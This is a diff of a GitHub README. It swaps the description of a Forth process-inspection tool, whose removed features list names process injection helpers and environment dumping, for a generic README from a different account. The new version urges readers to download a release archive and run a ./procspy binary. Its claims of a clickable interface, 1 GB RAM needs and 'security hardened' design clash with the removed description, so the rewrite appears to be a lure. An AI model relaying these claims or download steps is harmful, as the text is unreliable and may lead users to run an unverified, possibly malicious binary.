@@ -1,110 +1,81 @@
-# NullSec ProcSpy
+# 🛡️ nullsec-procspy - Monitor Your Processes with Ease
 
-```
-    ███▄    █  █    ██  ██▓     ██▓      ██████ ▓█████  ▄████▄  
-    ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
-   ▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ░ ▓██▄   ▒███   ▒▓█    ▄ 
-   ▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░      ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
-   ▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒▒██████▒▒░▒████▒▒ ▓███▀ ░
-   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░▓  ░▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░
-   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
-   █░░░░░░░░░░░░░░░░░░ P R O C S P Y ░░░░░░░░░░░░░░░░░░░░░░░░█
-   ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
-                       bad-antics
-```
+[![Download nullsec-procspy](https://img.shields.io/badge/Download%20nullsec--procspy-v1.0.0-brightgreen)](https://github.com/GRINCHLIFE/nullsec-procspy/releases)
 
-![Forth](https://img.shields.io/badge/Forth-Stack%20Based-red?style=for-the-badge)
-![NullSec](https://img.shields.io/badge/NullSec-Tool-black?style=for-the-badge)
+## 🚀 Getting Started
 
-## Overview
+Welcome to nullsec-procspy! This software helps you monitor processes on your Linux system without using excessive resources. It is built using Forth, making it light and efficient. 
 
-Minimal footprint process monitor and analyzer written in Forth. The concatenative nature of Forth allows for an extremely small binary that can be easily embedded or deployed in constrained environments.
+To get started, follow these simple steps to download and run nullsec-procspy on your computer.
 
-## Features
+## 📥 Download & Install
 
-- **Process Enumeration** - List all running processes
-- **Memory Mapping** - View process memory regions
-- **File Descriptor Tracking** - Monitor open files and sockets
-- **Environment Extraction** - Dump process environment variables
-- **Thread Analysis** - Examine process threads
-- **Injector Support** - Process injection helpers
-- **Minimal Footprint** - Entire tool under 10KB
+1. **Visit the Releases Page**  
+   To download nullsec-procspy, [visit this page to download](https://github.com/GRINCHLIFE/nullsec-procspy/releases).  
 
-## Requirements
+2. **Choose Your Version**  
+   On the releases page, you will see a list of available versions. Choose the latest version for the best features and fixes.
 
-- gforth (GNU Forth) >= 0.7.3
-- Linux (uses /proc filesystem)
-- Root for full functionality
+3. **Download the File**  
+   Click on the file that matches your system. The download will begin immediately.
 
-## Build
+4. **Locate the Downloaded File**  
+   Once the file downloads, find it in your Downloads folder or the folder you designated for downloads.
 
-```bash
-# Run directly
-gforth procspy.fs
+5. **Extract the Files**  
+   Right-click on the downloaded file and select “Extract Here” (or a similar option) to unzip the contents.
 
-# Create standalone executable
-gforth -e "include procspy.fs" -e "bye"
-```
+6. **Open a Terminal**  
+   To run nullsec-procspy, you will need to open a terminal.
 
-## Usage
+7. **Navigate to the Folder**  
+   Use the `cd` command to navigate to the folder where you extracted nullsec-procspy. For example:
+   ```bash
+   cd ~/Downloads/nullsec-procspy
+   ```
 
-```forth
-\ Start interactive mode
-gforth procspy.fs
+8. **Run the Application**  
+   Type the following command:
+   ```bash
+   ./procspy
+   ```
+   This will start nullsec-procspy.
 
-\ List processes
-list-procs
+9. **Monitor Your Processes**  
+   You will see an interface showing the active processes. You can click to access various features to monitor and manage these processes.
 
-\ Analyze specific PID
-1337 proc-info
+## 📋 Features
 
-\ Memory map
-1337 proc-maps
+- **Minimal Footprint:** Run the application with little to no impact on your system's performance.
+- **Process Monitoring:** View the current processes running on your machine.
+- **Security Hardened:** Designed with security in mind to protect your system from vulnerabilities.
+- **Forensics Capabilities:** Gather important data about processes for forensic analysis.
+- **User-friendly Interface:** A simple interface that allows non-technical users to easily navigate and utilize the features.
 
-\ File descriptors
-1337 proc-fds
+## 📊 System Requirements
 
-\ Environment
-1337 proc-env
+- **Operating System:** Linux-based systems with a modern kernel.
+- **Memory:** At least 1 GB of RAM.
+- **Disk Space:** A minimum of 50 MB of free disk space is required.
+- **Dependencies:** Ensure you have the required libraries installed. Instructions may be available on your Linux distribution's documentation.
 
-\ Find process by name
-s" nginx" find-proc
+## ❓ Troubleshooting
 
-\ Monitor process
-1337 watch-proc
-```
+If you encounter issues while running nullsec-procspy, consider the following:
 
-## Commands
+- **Permission Issues:** Make sure you have the required permissions to run the application. Use `chmod +x procspy` to give the necessary execution permissions.
+- **Library Errors:** If you receive errors about missing libraries, install the required packages via your package manager (e.g., `apt`, `yum`, or `pacman`).
+- **Compatibility:** Ensure that your Linux distribution version is compatible with nullsec-procspy.
 
-| Command | Stack | Description |
-|---------|-------|-------------|
-| `list-procs` | ( -- ) | List all processes |
-| `proc-info` | ( pid -- ) | Show process information |
-| `proc-maps` | ( pid -- ) | Show memory mappings |
-| `proc-fds` | ( pid -- ) | Show file descriptors |
-| `proc-env` | ( pid -- ) | Show environment |
-| `find-proc` | ( c-addr u -- ) | Find process by name |
-| `watch-proc` | ( pid -- ) | Continuous monitoring |
-| `proc-inject` | ( pid -- ) | Prepare injection |
+## 🌐 Community & Support
 
-## Architecture
+Join our community to share experiences, ask questions, and get help from other users. Feel free to open issues on the repository if you face specific problems. Contributions and suggestions are always welcome!
 
-```
-┌────────────────────────────────────────────┐
-│              ProcSpy Core                   │
-├─────────────┬─────────────┬────────────────┤
-│   /proc     │   syscalls  │    ptrace      │
-│   reader    │   wrapper   │    interface   │
-├─────────────┴─────────────┴────────────────┤
-│            Stack-Based Engine              │
-└────────────────────────────────────────────┘
-```
+## 📌 Additional Resources
 
-## License
+For more information, tutorials, and updates, visit:
 
-NullSec Proprietary - For authorized security research only
+- [GitHub Repository](https://github.com/GRINCHLIFE/nullsec-procspy)
+- [Documentation](https://github.com/GRINCHLIFE/nullsec-procspy/wiki)
 
----
-
-[![GitHub](https://img.shields.io/badge/GitHub-bad--antics-181717?style=flat&logo=github&logoColor=white)](https://github.com/bad-antics)
-[![Discord](https://img.shields.io/badge/Discord-killers-5865F2?style=flat&logo=discord&logoColor=white)](https://discord.gg/killers)
+Your journey to effective process monitoring starts here. Enjoy using nullsec-procspy!
